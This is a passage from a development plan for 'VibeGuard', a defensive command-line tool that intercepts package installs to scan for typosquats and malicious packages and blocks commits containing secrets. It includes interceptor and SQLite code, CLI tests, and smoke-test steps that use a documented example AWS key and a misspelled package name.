            name, version = arg.rsplit("@", 1)
            return [(name.strip(), version.strip())]
        else:
            return [(arg.strip(), "")]
    return []


def _parse_uv_args(args: list[str]) -> list[tuple[str, str]]:
    """Parse uv args — handles 'uv pip install X' and 'uv add X'."""
    if not args:
        return []

    if args[0] == "pip" and len(args) > 1 and args[1] == "install":
        return _parse_pip_packages(args[2:])
    elif args[0] == "add":
        return _parse_pip_packages(args[1:])
    return []


def _parse_pip_packages(args: list[str]) -> list[tuple[str, str]]:
    """Parse pip-style package arguments."""
    packages = []
    skip_next = False
    skip_flags = {"-r", "--requirement", "-c", "--constraint", "-e", "--editable",
                  "-t", "--target", "--prefix", "-i", "--index-url",
                  "--extra-index-url", "-f", "--find-links"}

    for arg in args:
        if skip_next:
            skip_next = False
            continue
        if arg in skip_flags:
            skip_next = True
            continue
        if arg.startswith("-"):
            continue
        if arg.startswith(".") or arg.startswith("/"):
            continue

        if "==" in arg:
            name, version = arg.split("==", 1)
            packages.append((name.strip(), version.strip()))
        elif ">=" in arg or "<=" in arg or "~=" in arg or "!=" in arg:
            name = arg.split(">")[0].split("<")[0].split("~")[0].split("!")[0]
            packages.append((name.strip(), ""))
        else:
            packages.append((arg.strip(), ""))

    return packages


def _parse_npm_packages(args: list[str]) -> list[tuple[str, str]]:
    """Parse npm-style package arguments (npm, yarn, pnpm, bun)."""
    packages = []
    skip_next = False
    skip_flags = {"--registry", "--save-prefix"}

    for arg in args:
        if skip_next:
            skip_next = False
            continue
        if arg in skip_flags:
            skip_next = True
            continue
        if arg.startswith("-"):
            continue
        if arg.startswith(".") or arg.startswith("/"):
            continue

        if "@" in arg and not arg.startswith("@"):
            name, version = arg.rsplit("@", 1)
            packages.append((name.strip(), version.strip()))
        elif arg.startswith("@") and arg.count("@") == 2:
            name, version = arg.rsplit("@", 1)
            packages.append((name.strip(), version.strip()))
        else:
            packages.append((arg.strip(), ""))

    return packages


def get_ai_provider():
    """Load the configured AI provider, if any."""
    config = load_config()
    if not config.ai_provider:
        return None

    if config.ai_provider == "anthropic":
        return AnthropicProvider(
            api_key=config.ai_api_key or "",
            oauth_token=config.ai_oauth_token or "",
        )
    elif config.ai_provider == "openai":
        return OpenAIProvider(
            api_key=config.ai_api_key or "",
            oauth_token=config.ai_oauth_token or "",
        )
    return None


def run_intercept(manager: str, args: list[str]) -> int:
    """Main interception flow. Returns exit code (0 = proceed, 1 = blocked)."""
    packages = parse_install_args(list(args), manager=manager)
    registry = get_registry(manager)  # "pip" or "npm" — used for scanning

    if not packages:
        # Not an install command or no packages — pass through
        return _passthrough(manager, args)

    config = load_config()
    provider = get_ai_provider()
    blocked = False

    for name, version in packages:
        start = time.time()

        # Tier 1: Fast checks
        result = tier1_scan(name, manager=registry)

        if result.safe and not result.reason:
            # Known safe — skip further checks
            elapsed = f"{time.time() - start:.1f}s"
            show_safe(name, version, elapsed)
            continue

        if not result.safe:
            # Tier 1 flagged it
            show_blocked(name, result.reason, result.suggestion)
            blocked = True
            config.packages_blocked += 1
            continue

        # Tier 2: Deep scan (only for unknown packages)
        result = tier2_scan(name, version, manager=registry)

        if not result.safe:
            # Try tier 3 for AI explanation
            if provider and provider.is_configured():
                t3 = tier3_scan(name, result.reason, provider=provider)
                if t3.details:
                    result.details = t3.details
                if t3.suggestion:
                    result.suggestion = t3.suggestion

            show_blocked(name, result.reason, result.suggestion)
            if result.details:
                from rich.console import Console
                Console().print(f"  [dim]{result.details}[/dim]")
            blocked = True
            config.packages_blocked += 1
            continue

        elapsed = f"{time.time() - start:.1f}s"
        show_safe(name, version, elapsed)

    config.packages_scanned += len(packages)
    save_config(config)

    if blocked:
        return 1

    # All clean — run the actual pip/npm command
    return _passthrough(manager, args)


def _passthrough(manager: str, args: list[str]) -> int:
    """Execute the original pip/npm command."""
    cmd = [manager] + list(args)
    result = subprocess.run(cmd)
    return result.returncode
```

- [ ] **Step 3: Run tests, commit**

```bash
python -m pytest tests/test_interceptor.py -v
git add src/vibeguard/interceptor.py tests/test_interceptor.py
git commit -m "feat: package interceptor with tiered scanning flow"
```

---

### Task 13: Wire up full CLI

**Files:**
- Modify: `src/vibeguard/cli.py`
- Create: `src/vibeguard/db.py`
- Modify: `tests/test_cli.py`

- [ ] **Step 1: Implement SQLite stats DB**

```python
# src/vibeguard/db.py
"""SQLite database for scan history and stats."""

import sqlite3
from datetime import datetime
from pathlib import Path

from vibeguard.constants import DB_PATH


def _get_conn() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH))
    conn.execute("""
        CREATE TABLE IF NOT EXISTS scan_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            scan_type TEXT NOT NULL,
            target TEXT NOT NULL,
            result TEXT NOT NULL,
            details TEXT
        )
    """)
    conn.commit()
    return conn


def log_scan(scan_type: str, target: str, result: str, details: str = ""):
    """Log a scan result."""
    conn = _get_conn()
    conn.execute(
        "INSERT INTO scan_log (timestamp, scan_type, target, result, details) VALUES (?, ?, ?, ?, ?)",
        (datetime.now().isoformat(), scan_type, target, result, details),
    )
    conn.commit()
    conn.close()


def get_last_scan() -> dict | None:
    """Get the most recent scan entry."""
    conn = _get_conn()
    row = conn.execute(
        "SELECT timestamp, scan_type, target, result FROM scan_log ORDER BY id DESC LIMIT 1"
    ).fetchone()
    conn.close()
    if row:
        return {"timestamp": row[0], "type": row[1], "target": row[2], "result": row[3]}
    return None
```

- [ ] **Step 2: Wire up CLI commands fully**

Update `src/vibeguard/cli.py` with full implementations of `install`, `uninstall`, `status`, `intercept`, and `scan-secrets` commands. The install command should:

1. Show welcome banner
2. Prompt user to choose AI provider (interactive menu via Rich)
3. If API key chosen, prompt for key
4. If OAuth chosen, open browser (placeholder for now)
5. Install shell hook
6. Download betterleaks binary (with progress bar)
7. Install git hook
8. Save config
9. Show success message

The `status` command should show the full Rich panel from `display.py`.

The `intercept` command should call `run_intercept()`.

The `scan-secrets` command should:
1. Get staged files via `git diff --cached --name-only`
2. Run betterleaks on them
3. Block commit if secrets found

- [ ] **Step 3: Add integration tests for CLI**

```python
# Add to tests/test_cli.py

def test_cli_install_local_only(tmp_vibeguard_home, tmp_path, monkeypatch):
    """Test install with local-only mode (non-interactive)."""
    runner = CliRunner()
    rc_file = tmp_path / ".zshrc"
    rc_file.write_text("")
    monkeypatch.setattr("vibeguard.installer.get_shell_rc_path", lambda: rc_file)
    monkeypatch.setattr("vibeguard.cli.get_shell_rc_path", lambda: rc_file)

    result = runner.invoke(main, ["install", "--local-only"])
    assert result.exit_code == 0
    assert "vibeguard" in rc_file.read_text().lower()


def test_cli_uninstall(tmp_vibeguard_home, tmp_path, monkeypatch):
    runner = CliRunner()
    rc_file = tmp_path / ".zshrc"
    rc_file.write_text("")
    monkeypatch.setattr("vibeguard.installer.get_shell_rc_path", lambda: rc_file)

    runner.invoke(main, ["install", "--local-only"])
    result = runner.invoke(main, ["uninstall"])
    assert result.exit_code == 0
```

- [ ] **Step 4: Run all tests**

```bash
python -m pytest -v
```

- [ ] **Step 5: Commit**

```bash
git add src/vibeguard/cli.py src/vibeguard/db.py tests/test_cli.py tests/test_db.py
git commit -m "feat: full CLI wiring — install, uninstall, status, intercept, scan-secrets"
```

---

## Chunk 6: Polish + README + PyPI Prep

### Task 14: README and final polish

**Files:**
- Create: `README.md`

- [ ] **Step 1: Write README**

The README should include:
- One-liner description
- Demo showing the user journey (install → pip intercepted → secret blocked)
- Installation: `pip install vibeguard && vibeguard install`
- **Supported package managers** section with coverage table:
  - Python: `pip`, `pip3`, `uv` (pip install + add), `pipx`
  - Node.js: `npm`, `npx`, `yarn`, `pnpm`, `bun`, `bunx`
  - Note: npx/bunx are especially dangerous (download + execute in one step)
- What it does (5 shields overview — mark which are MVP vs coming soon)
- AI provider options (Anthropic OAuth/key, OpenAI OAuth/key, local-only)
- How it works (brief architecture)
- License (MIT)
- Third-party notices reference (betterleaks)
- Contributing section

- [ ] **Step 2: Verify editable install works**

```bash
cd "/Volumes/Second Disk/vibeguard"
pip install -e ".[dev]"
vibeguard --version
vibeguard --help
```

- [ ] **Step 3: Run full test suite**

```bash
python -m pytest -v --cov=vibeguard
```

- [ ] **Step 4: Commit**

```bash
git add README.md
git commit -m "docs: README with install instructions and feature overview"
```

---

### Task 15: Smoke test the full flow

No new files — manual testing of the end-to-end flow.

- [ ] **Step 1: Test install flow**

```bash
vibeguard install  # Choose local-only for testing
```

Verify:
- Shell hook added to `~/.zshrc`
- betterleaks downloaded to `~/.vibeguard/bin/betterleaks`
- Git hook set via `git config --global core.hooksPath`
- Config written to `~/.vibeguard/config.toml`
- Prompt indicator appears in new shell

- [ ] **Step 2: Test pip interception**

Open a new terminal (to load the shell hook), then:

```bash
pip install flask          # Should show ✔ clean
pip install reqeusts       # Should show ✖ typosquat warning
```

- [ ] **Step 3: Test secret scanning**

```bash
cd $(mktemp -d) && git init
echo 'AKIAIOSFODNN7EXAMPLE' > secret.txt
git add secret.txt
git commit -m "test"       # Should be blocked by VibeGuard
```

- [ ] **Step 4: Test status**

```bash
vibeguard status
```

Should show the Rich panel with stats.

- [ ] **Step 5: Test uninstall**

```bash
vibeguard uninstall
```

Verify hooks removed, config cleaned.

- [ ] **Step 6: Fix any issues found, commit**

---

## Summary

| Chunk | Tasks | What it delivers |
|-------|-------|-----------------|
| 1 | 1-4 | Project scaffold, config, CLI skeleton, display |
| 2 | 5-6 | Shell hooks, git hooks, betterleaks bundling |
| 3 | 7-8 | Tier 1 + Tier 2 package scanning |
| 4 | 9-11 | AI providers (Anthropic + OpenAI) + Tier 3 |
| 5 | 12-13 | Interceptor flow, full CLI wiring, SQLite DB |
| 6 | 14-15 | README, polish, smoke test |

**Total: 15 tasks, ~6 chunks, each chunk produces working testable software.**
